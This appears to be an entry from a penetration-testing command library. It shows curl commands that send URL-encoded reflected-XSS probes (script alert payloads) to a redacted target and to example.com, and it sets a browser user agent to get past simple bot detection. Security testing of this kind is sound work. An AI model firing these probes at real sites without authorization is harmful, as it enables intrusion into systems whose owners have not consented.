---
data: >-
  curl -v "https://example.com/vuln?param=%3Cscript%3Ealert('XSS')%3C/script%3E"
  --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
tags:
  - web-testing
  - xss
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.545Z'
id: d1547fbf-b505-43e1-b79d-f915f7eb2d8c
verified: false
validated: true
submitted: true
---
# curl-fetch-payload

## Command

```bash
curl -v "https://███/████=https://████████████/%3C/script%3E%3Cscript%3Ealert(origin)%3C/script%3E&██████" --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

## Description

This command uses curl to fetch a web page with a malicious URL-encoded JavaScript payload, simulating a browser request to test for reflected XSS. It helps verify if the payload is reflected in the response without executing in curl itself (use a browser for execution confirmation). Ideal for initial vulnerability probing in web applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output to show headers and response body | Yes |
| URL | The full target URL with encoded payload in query param | Yes |
| `--user-agent` | Mimics a browser to bypass simple bot detection | Yes |

## Examples

### Basic Usage

```bash
curl -v "https://example.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E" --user-agent "Mozilla/5.0"
```

### Advanced Usage

```bash
curl -v "https://███/████=https://████████████/%3C/script%3E%3Cscript%3Ealert(origin)%3C/script%3E&██████" --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -H "Accept: text/html"
```

## Expected Output

Verbose HTTP response including status code (e.g., 200 OK), headers, and body. Look for the unencoded `<script>alert(origin)</script>` in the HTML body, indicating reflection and potential XSS. No JavaScript execution in curl; use browser for that.

## Related

- [[Related Procedure|Inject-JavaScript-Payload-for-Reflected-XSS]]
